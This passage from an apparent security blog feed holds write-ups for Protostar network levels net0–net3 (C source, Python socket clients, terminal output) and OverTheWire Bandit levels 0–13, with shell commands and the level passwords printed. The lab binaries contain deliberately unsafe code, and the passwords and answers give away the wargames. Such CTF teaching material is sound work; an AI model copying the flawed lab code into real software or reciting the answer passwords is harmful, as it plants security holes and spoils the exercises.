&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &quot;../common/common.c&quot;
#define NAME &quot;net0&quot;
#define UID 999
#define GID 999
#define PORT 2999
void run()
{
	unsigned int i;
	unsigned int wanted;
	wanted = random();
	printf(&quot;Please send '%d' as a little endian 32bit int\n&quot;, wanted);
	if(fread(&amp;amp;i, sizeof(i), 1, stdin) == NULL) {
		errx(1, &quot;:(\n&quot;);
	}
	if(i == wanted) {
		printf(&quot;Thank you sir/madam\n&quot;);
	} else {
		printf(&quot;I'm sorry, you sent %d instead\n&quot;, i);
	}
}
int main(int argc, char **argv, char **envp)
{
	int fd;
	char *username;
	
    /* Run the process as a daemon */
	background_process(NAME, UID, GID);
	
    /* Wait for socket activity and return */
	fd = serve_forever(PORT);
	
    /* Set the client socket to STDIN, STDOUT, and STDERR */
	set_io(fd);
 	
    /* Don't do this :&amp;gt; */
	srandom(time(NULL));
    
	run();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The net0 process listens on port 2999. Let us interact with it using netcat.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;user@protostar:/opt/protostar/bin$ clear
user@protostar:/opt/protostar/bin$ nc localhost 2999
Please send '827889081' as a little endian 32bit int
^C
user@protostar:/opt/protostar/bin$ nc localhost 2999
Please send '1477868572' as a little endian 32bit int
827889081
I'm sorry, you sent 943141432 instead
user@protostar:/opt/protostar/bin$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;On connecting to port 2999, the net0 process sends a text containing a number. We are expected to send back the number in little endian 32 bit.&lt;/p&gt;
&lt;h4 id=&quot;solution&quot;&gt;Solution&lt;/h4&gt;
&lt;p&gt;Below is what needs to be done in order to solve this challenge.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Connect to target process on port 2999.&lt;/li&gt;
  &lt;li&gt;Read the text sent by net0.&lt;/li&gt;
  &lt;li&gt;Identify the number to be sent back.&lt;/li&gt;
  &lt;li&gt;Convert the number to little endian 32 bit.&lt;/li&gt;
  &lt;li&gt;Send back the result.&lt;/li&gt;
  &lt;li&gt;Read the response.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Below is the net0 solution written in python.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Author        : RIZAL MUHAMMED [UB3RSiCK]
# Desc          : Exploit Exercises Protostar - Net0 Solution

from socket import create_connection as cc
import struct
import sys
import re

try:
        con = cc(('localhost', 2999))
except:
        print '[-] Connection Failed'
        sys.exit(0)

print '[*] Connected'
dat = con.recv(1024)

# Get the wanted number from the received string - enclosed within single quotes
wanted_num = re.findall(r&quot;'(.*?)'&quot;, dat, re.DOTALL)[0]

print '[*] Received data \n\t', dat
print '[*] Number to send back in little endian 32 bit', wanted_num

# convert int to little endian
res = struct.pack(&quot;&amp;lt;I&quot;, int(wanted_num))

print '[*] Sending back result', repr(res)
con.send(res)
print '[*] Reading response from server'
print '\t', con.recv(1024)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Terminal Output&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;user@protostar:/opt/protostar/bin$ python /tmp/net0.py 
[*] Connected
[*] Received data 
	Please send '312988072' as a little endian 32bit int

[*] Number to send back in little endian 32 bit 312988072
[*] Sending back result '\xa8\xd1\xa7\x12'
[*] Reading response from server
	Thank you sir/madam

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;net1&quot;&gt;Net1&lt;/h3&gt;

&lt;p&gt;This level tests the ability to convert binary integers into ascii representation. This level is at &lt;strong&gt;/opt/protostar/bin/net1&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;source-code-1&quot;&gt;Source Code&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &quot;../common/common.c&quot;
#define NAME &quot;net1&quot;
#define UID 998
#define GID 998
#define PORT 2998

void run()
{
	char buf[12];
	char fub[12];
	char *q;
	unsigned int wanted;
	
    wanted = random();
	sprintf(fub, &quot;%d&quot;, wanted);

	if(write(0, &amp;amp;wanted, sizeof(wanted)) != sizeof(wanted)) {
		errx(1, &quot;:(\n&quot;);
	}
	if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {
		errx(1, &quot;:(\n&quot;);
	}

	q = strchr(buf, '\r'); if(q) *q = 0;
	q = strchr(buf, '\n'); if(q) *q = 0;

	if(strcmp(fub, buf) == 0) {
		printf(&quot;you correctly sent the data\n&quot;);
	} else {
		printf(&quot;you didn't send the data properly\n&quot;);
	}
}
int main(int argc, char **argv, char **envp)
{
	int fd;
	char *username;

	/* Run the process as a daemon */
	background_process(NAME, UID, GID);

	/* Wait for socket activity and return */
	fd = serve_forever(PORT);

	/* Set the client socket to STDIN, STDOUT, and STDERR */
	set_io(fd);

	/* Don't do this :&amp;gt; */
	srandom(time(NULL));

	run();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;solution-1&quot;&gt;Solution&lt;/h4&gt;
&lt;p&gt;Below is what needs to be done in order to solve this challenge.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Connect to target process on port 2998.&lt;/li&gt;
  &lt;li&gt;Read in data sent by net0.&lt;/li&gt;
  &lt;li&gt;Unpack the data and convert to unsigned int.&lt;/li&gt;
  &lt;li&gt;Send back the result in string format.&lt;/li&gt;
  &lt;li&gt;Read the response.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Below is the net1 solution written in python.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Author        : RIZAL MUHAMMED [UB3RSiCK]
# Desc          : Exploit Exercises Protostar - Net1 Solution

from socket import create_connection as cc
import struct
import sys

try:
        con = cc(('localhost', 2998))
except:
        print '[-] Connection Failed'
        sys.exit(0)

print '[*] Connected to localhost on port 2998'
dat = con.recv(1024)

# int to unsigned int
unpacked_dat = struct.unpack(&quot;&amp;lt;I&quot;, dat)[0]
print '[*] Received data \n\t', repr(dat)
print '[*] Unpacked unsigned data', unpacked_dat

# Convert the unpacked data to string
res = str(unpacked_dat)

print '[*] Sending back result',  res
con.send(res)

print '[*] Reading response from server'
print '\t', con.recv(1024)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Terminal Output&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;user@protostar:/opt/protostar/bin$ python /tmp/net1.py 
[*] Connected to localhost on port 2998
[*] Received data 
	'$y*o'
[*] Unpacked unsigned data 1865054500
[*] Sending back result 1865054500
[*] Reading response from server
	you correctly sent the data
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;net2&quot;&gt;Net2&lt;/h3&gt;
&lt;p&gt;This code tests the ability to add up 4 unsigned 32-bit integers.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Hint: Keep in mind that it wraps.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level is at &lt;strong&gt;/opt/protostar/bin/net2&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;source-code-2&quot;&gt;Source Code&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &quot;../common/common.c&quot;
#define NAME &quot;net2&quot;
#define UID 997
#define GID 997
#define PORT 2997
void run()
{
	unsigned int quad[4];
	int i;
	unsigned int result, wanted;
	result = 0;
	
    for(i = 0; i &amp;lt; 4; i++) {
		quad[i] = random();
		result += quad[i];

		if(write(0, &amp;amp;(quad[i]), sizeof(result)) != sizeof(result)) {
			errx(1, &quot;:(\n&quot;);
		}
	}

	if(read(0, &amp;amp;wanted, sizeof(result)) != sizeof(result)) {
		errx(1, &quot;:&amp;lt;\n&quot;);
	}
	
    if(result == wanted) {
		printf(&quot;you added them correctly\n&quot;);
	} else {
		printf(&quot;sorry, try again. invalid\n&quot;);
	}
}
int main(int argc, char **argv, char **envp)
{
	int fd;
	char *username;

    /* Run the process as a daemon */
	background_process(NAME, UID, GID);

	/* Wait for socket activity and return */
	fd = serve_forever(PORT);

	/* Set the client socket to STDIN, STDOUT, and STDERR */
	set_io(fd);

	/* Don't do this :&amp;gt; */
	srandom(time(NULL));

	run();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;solution-2&quot;&gt;Solution&lt;/h4&gt;
&lt;p&gt;The net0 process sends back four 32 bit numbers in little endian. We are expecteed to send back their sum. Below is what needs to be done in order to solve this challenge.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Connect to target process on port 2997.&lt;/li&gt;
  &lt;li&gt;Read in the 4 numbers (they are in little endian).&lt;/li&gt;
  &lt;li&gt;Unpack the 4 numbers to unsigned integer.&lt;/li&gt;
  &lt;li&gt;Add the four numbers (handle wrapping as well).&lt;/li&gt;
  &lt;li&gt;Send back the result.&lt;/li&gt;
  &lt;li&gt;Read the response.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Below is the solution for net2.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc		: Exploit Exercises Protostar - Net2 Solution

from socket import create_connection as cc
import struct
import sys

# Handle wrapping when adding
M32 = 0xffffffffL
def m32(n):
    return n &amp;amp; M32

def madd(a, b):
    return m32(a+b)

try:
	con = cc(('localhost', 2997))
except:
	print '[-] Connection Failed'
	sys.exit(0)

print '[*] Connected to localhost on port 2997'

dat_list = []

# Read the four numbers
for i in range(4):
	dat = con.recv(1024)
	dat_list.append(dat)

print '[*] Received Data ', dat_list

# unpack the data from int to unsigned int
unpacked_dat_list = [struct.unpack(&quot;&amp;lt;I&quot;, item)[0] for item in dat_list]

sum = 0
print '[*] Unpacked unsigned integer data ', unpacked_dat_list

for item in unpacked_dat_list:
	sum = madd(sum, item)

print '[*] Final added sum : ', sum

res = str(struct.pack(&quot;&amp;lt;I&quot;, sum))
print '[*] Sending sum [string, little endian] to server : ', repr(res)
con.send(res)

print '[*] Response from server : \033[92m', con.recv(1024), '\033[0m'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Terminal Output&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;user@protostar:/opt/protostar/bin$ python /tmp/net2.py 
[*] Connected to localhost on port 2997
[*] Received Data  ['\xd6\xe4e\x1a', '\xd3\x94k\x17', '\xf0mN\x05', '\xc2\x1b\xaa9']
[*] Unpacked unsigned integer data  [442885334, 392926419, 89026032, 967449538]
[*] Final added sum :  1892287323
[*] Sending sum [string, little endian] to server :  '[\x03\xcap'
[*] Response from server :  you added them correctly
user@protostar:/opt/protostar/bin$
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;net3&quot;&gt;Net3&lt;/h3&gt;
&lt;p&gt;This level tests the ability to understand code, and implement a simple network protocol. This level is at &lt;strong&gt;/opt/protostar/bin/net3&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;source-code-3&quot;&gt;Source Code&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &quot;../common/common.c&quot;

#define NAME &quot;net3&quot;
#define UID 996
#define GID 996
#define PORT 2996

/*
 * Extract a null terminated string from the buffer 
 */

int get_string(char **result, unsigned char *buffer, u_int16_t len)
{
  unsigned char byte;

  byte = *buffer;

  if(byte &amp;gt; len) errx(1, &quot;badly formed packet&quot;);
  *result = malloc(byte);
  strcpy(*result, buffer + 1);

  return byte + 1;
}

/*
 * Check to see if we can log into the host
 */

int login(unsigned char *buffer, u_int16_t len)
{
  char *resource, *username, *password;
  int deduct;
  int success;

  if(len &amp;lt; 3) errx(1, &quot;invalid login packet length&quot;);

  resource = username = password = NULL;

  deduct = get_string(&amp;amp;resource, buffer, len);
  deduct += get_string(&amp;amp;username, buffer+deduct, len-deduct);
  deduct += get_string(&amp;amp;password, buffer+deduct, len-deduct);

  success = 0;
  success |= strcmp(resource, &quot;net3&quot;);
  success |= strcmp(username, &quot;awesomesauce&quot;);
  success |= strcmp(password, &quot;password&quot;);

  free(resource);
  free(username);
  free(password);

  return ! success;
}

void send_string(int fd, unsigned char byte, char *string)
{
  struct iovec v[3];
  u_int16_t len;
  int expected;

  len = ntohs(1 + strlen(string));

  v[0].iov_base = &amp;amp;len;
  v[0].iov_len = sizeof(len);
  
  v[1].iov_base = &amp;amp;byte;
  v[1].iov_len = 1;

  v[2].iov_base = string;
  v[2].iov_len = strlen(string);

  expected = sizeof(len) + 1 + strlen(string);

  if(writev(fd, v, 3) != expected) errx(1, &quot;failed to write correct amount of bytes&quot;);
  
}

void run(int fd)
{
  u_int16_t len;
  unsigned char *buffer;
  int loggedin;

  while(1) {
      nread(fd, &amp;amp;len, sizeof(len));
      len = ntohs(len);
      buffer = malloc(len);

      if(! buffer) errx(1, &quot;malloc failure for %d bytes&quot;, len);

      nread(fd, buffer, len);

      switch(buffer[0]) {
          case 23:
              loggedin = login(buffer + 1, len - 1);
              send_string(fd, 33, loggedin ? &quot;successful&quot; : &quot;failed&quot;);
              break;
          
          default:
              send_string(fd, 58, &quot;what you talkin about willis?&quot;);
              break;
      }
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  /* Don't do this :&amp;gt; */
  srandom(time(NULL));

  run(fd);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;solution-3&quot;&gt;Solution&lt;/h4&gt;

&lt;p&gt;The net3 process reads from socket a value and converts the unsigned short integer netshort from network byte order to host byte order - the &lt;strong&gt;ntohs()&lt;/strong&gt; function. This value is saved in a variable named &lt;strong&gt;len&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;      nread(fd, &amp;amp;len, sizeof(len));
      len = ntohs(len);
      buffer = malloc(len);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then, &lt;strong&gt;len&lt;/strong&gt; amount of memory is allocated for &lt;strong&gt;buffer&lt;/strong&gt; in heap using &lt;strong&gt;malloc()&lt;/strong&gt;. After this, the process again reads from socket &lt;strong&gt;len&lt;/strong&gt; amount of data and stores in &lt;strong&gt;buffer&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The process then checks if the first element, ie buffer[0] is &lt;strong&gt;23 or 0x17&lt;/strong&gt;. If the value is 0x17, then the login() function is invoked with parameters &lt;strong&gt;buffer[1:]&lt;/strong&gt;  and &lt;strong&gt;(len-1)&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;buffer[1:] - buffer starting from first element. The zeroth value, ie the 0x17 is avoided.
len-1 is the lenth of the buffer now.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The login function checks the received buffer for the presence of three null terminated strings. Each should be prepended with their respective lengths, taking into consideration the null byte at the end.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;\x05net3\x00
\x0dawesomesauce\x00
\x09password\x00&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Below is the net3 solution.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Exploit Exercises Protostar - Net3 Solution

from socket import create_connection as cc
import sys
import struct

try:
	con = cc(('localhost', 2996))
except:
	print '[-] Connection Failed'
	sys.exit(0)

print '[*] Connected to localhost on port 2996'

login_string = '\x17'
login_string += '\x05net3\x00'
login_string += '\x0dawesomesauce\x00'
login_string += '\x09password\x00'

login_len = len(login_string)

print '[*] Login string : ', repr(login_string)
print '[*] Login string length : ', login_len

print '[*] Sending Login string length'

# ! -	network (= big-endian) /
# &amp;gt; -	big-endian
# H -	unsigned short

# Either !H or &amp;gt;H would work
con.send(struct.pack('!H', login_len))

print '[*] Sending Login string'
con.send(login_string)

print '[*] Response from net3 : ', con.recv(1024)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Terminal Output&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;user@protostar:/opt/protostar/bin$ python /tmp/net3.py 
[*] Connected to localhost on port 2996
[*] Login string :  '\x17\x05net3\x00\rawesomesauce\x00\tpassword\x00'
[*] Login string length :  31
[*] Sending Login string length
[*] Sending Login string
[*] Response from net3 :  
                          !successful
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;
</content>

 </entry>
 
 <entry>
   <title>OverTheWire - Bandit</title>
   <link href="http://localhost:4000/2018/05/09/otw-bandit/"/>
   <updated>2018-05-09T00:00:00+04:00</updated>
   <id>http://localhost:4000/2018/05/09/otw-bandit</id>
   <content type="html">&lt;p&gt;The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;level-0&quot;&gt;Level 0&lt;/h2&gt;
&lt;p&gt;he goal of this level is for you to log into the game using SSH. The host to which you need to connect is &lt;strong&gt;bandit.labs.overthewire.org&lt;/strong&gt;, on port &lt;strong&gt;2220&lt;/strong&gt;. The username is &lt;strong&gt;bandit0&lt;/strong&gt; and the password is &lt;strong&gt;bandit0&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;level-0---level-1&quot;&gt;Level 0 - Level 1&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in a file called &lt;strong&gt;readme&lt;/strong&gt; located in the home directory. Use this password to log into bandit1 using SSH.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit0@bandit:/home$ find . -type f -name readme 2&amp;gt;/dev/null
./bandit18/readme
./bandit0/readme
bandit0@bandit:/home$ cat ./bandit0/readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-1---level-2&quot;&gt;Level 1 - Level 2&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in a file called &lt;strong&gt;-&lt;/strong&gt; located in the home directory.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit1@bandit:~$ pwd
/home/bandit1
bandit1@bandit:~$ ls -l
total 4
-rw-r----- 1 bandit2 bandit1 33 Dec 28 14:34 -
bandit1@bandit:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-2---level-3&quot;&gt;Level 2 - Level 3&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in a file called &lt;strong&gt;spaces in this filename&lt;/strong&gt; located in the home directory.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit2@bandit:~$ ls -l
total 4
-rw-r----- 1 bandit3 bandit2 33 Dec 28 14:34 spaces in this filename
bandit2@bandit:~$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-3---level-4&quot;&gt;Level 3 - Level 4&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in a hidden file in the &lt;strong&gt;inhere&lt;/strong&gt; directory.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit3@bandit:~/inhere$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Dec 28 14:34 .
drwxr-xr-x 3 root    root    4096 Dec 28 14:34 ..
-rw-r----- 1 bandit4 bandit3   33 Dec 28 14:34 .hidden
bandit3@bandit:~/inhere$ cat ./.hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-4---level-5&quot;&gt;Level 4 - Level 5&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in the &lt;strong&gt;only human-readable&lt;/strong&gt; file in the inhere directory.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit4@bandit:~/inhere$ ls -l
total 40
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file00
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file01
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file02
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file03
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file04
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file05
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file06
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file07
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file08
-rw-r----- 1 bandit5 bandit4 33 Dec 28 14:34 -file09
bandit4@bandit:~/inhere$ strings ./*
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
~!\
=?G0
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-5---level-6&quot;&gt;Level 5 - Level 6&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:&lt;/p&gt;
&lt;blockquote&gt;

  &lt;pre&gt;&lt;code&gt;human-readable
1033 bytes in size
not executable
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;bandit5@bandit:~/inhere$ find . -type f -size 1033c ! -executable
./maybehere07/.file2
bandit5@bandit:~/inhere$ cat ./maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-6---level-7&quot;&gt;Level 6 - Level 7&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored somewhere on the server and has all of the following properties:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;owned by user bandit7
    owned by group bandit6
    33 bytes in size&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2&amp;gt;/dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-7---level-8&quot;&gt;Level 7 - Level 8&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt next to the word &lt;strong&gt;millionth&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit7@bandit:~$ ls -l
total 4088
-rw-r----- 1 bandit8 bandit7 4184396 Dec 28 14:34 data.txt
bandit7@bandit:~$ grep millionth data.txt
millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-8---level-9&quot;&gt;Level 8 - Level 9&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in the file &lt;strong&gt;data.txt&lt;/strong&gt; and is the only line of text that occurs only once.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit8@bandit:~$ cat data.txt | sort | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-9---level-10&quot;&gt;Level 9 - Level 10&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in the file &lt;strong&gt;data.txt&lt;/strong&gt; in one of the few human-readable strings, beginning with several ‘=’ characters.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit9@bandit:~$ strings data.txt | grep &quot;^==*&quot;
=-VW+
========== theP`
========== password
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-10---level-11&quot;&gt;Level 10 - Level 11&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in the file &lt;strong&gt;data.txt&lt;/strong&gt;, which contains &lt;strong&gt;base64 encoded&lt;/strong&gt; data.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit10@bandit:~$ cat data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-11---level-12&quot;&gt;Level 11 - Level 12&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.
&lt;a href=&quot;https://exploitshit.wordpress.com/2015/04/25/decode-rot13-on-linux-command-line/&quot;&gt;ROT13 Decode&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit11@bandit:~$ cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-12---level-13&quot;&gt;Level 12 - Level 13&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/ub3r$ cat data.txt 
00000000: 1f8b 0808 ecf2 445a 0203 6461 7461 322e  ......DZ..data2.
00000010: 6269 6e00 0149 02b6 fd42 5a68 3931 4159  bin..I...BZh91AY
00000020: 2653 5930 3e1b 4000 0014 ffff dde3 2b6d  &amp;amp;SY0&amp;gt;.@.......+m
00000030: afff dd1e dfd7 ffbf bdfb 3f67 bfff ffff  ..........?g....
00000040: bde5 bfff aff7 bfdb e5ff ffef b001 39b0  ..............9.
00000050: 480d 3400 0068 0068 1a00 0000 01a3 4000  H.4..h.h......@.
....snipped
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/ub3r$ cat data.txt | xxd -r &amp;gt; data1.bin
bandit12@bandit:/tmp/ub3r$ file data1.bin
data1.bin: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
bandit12@bandit:/tmp/ub3r$ cp data1.bin data1.gz
bandit12@bandit:/tmp/ub3r$ zcat data1.gz &amp;gt; data2.bin
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/ub3r$ file data2.bin
data2.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/ub3r$ cp data2.bin data2.bz2
bandit12@bandit:/tmp/ub3r$ bzip2 -dk data2.bz2
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/ub3r$ file data2
data2: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
bandit12@bandit:/tmp/ub3r$ cp data2 data3.gz
bandit12@bandit:/tmp/ub3r$ zcat data3.gz &amp;gt; data4.bin
bandit12@bandit:/tmp/ub3r$ file data4.bin
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/ub3r$ file data4.bin
data4.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/ub3r$ cp data4.bin data4.tar
bandit12@bandit:/tmp/ub3r$ tar -xvf data4.tar
data5.bin
bandit12@bandit:/tmp/ub3r$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/ub3r$ cp data5.bin data5.tar
bandit12@bandit:/tmp/ub3r$ tar -xvf data5.tar
data6.bin
bandit12@bandit:/tmp/ub3r$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/ub3r$ cp data6.bin data6.bz2
bandit12@bandit:/tmp/ub3r$ bzip2 -dk data6.bz2
bandit12@bandit:/tmp/ub3r$ ls -l data6
-rw-r--r-- 1 bandit12 bandit12 10240 Apr 16 09:06 data6
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/ub3r$ file data6
data6: POSIX tar archive (GNU)
bandit12@bandit:/tmp/ub3r$ cp data6 data6.tar
bandit12@bandit:/tmp/ub3r$ tar -xvf data6.tar
data8.bin
bandit12@bandit:/tmp/ub3r$ file data8.bin
data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
bandit12@bandit:/tmp/ub3r$ cp data8.bin data8.gz
bandit12@bandit:/tmp/ub3r$ zcat data8.gz &amp;gt; data9.bin
bandit12@bandit:/tmp/ub3r$ file data9.bin
data9.bin: ASCII text
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally we get the password.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit12@bandit:/tmp/ub3r$ cat data9.bin 
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;level-13---level-14&quot;&gt;Level 13 - Level 14&lt;/h2&gt;
&lt;p&gt;The password for the next level is stored in &lt;strong&gt;/etc/bandit_pass/bandit14&lt;/strong&gt; and &lt;strong&gt;can only be read by user bandit14&lt;/strong&gt;. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit13@bandit:~$ ls -l
total 4
-rw-r----- 1 bandit14 bandit13 1679 Dec 28 14:34 sshkey.private
bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
....
bandit14@bandit:~$
&lt;/code&gt;&lt;/pre&gt;
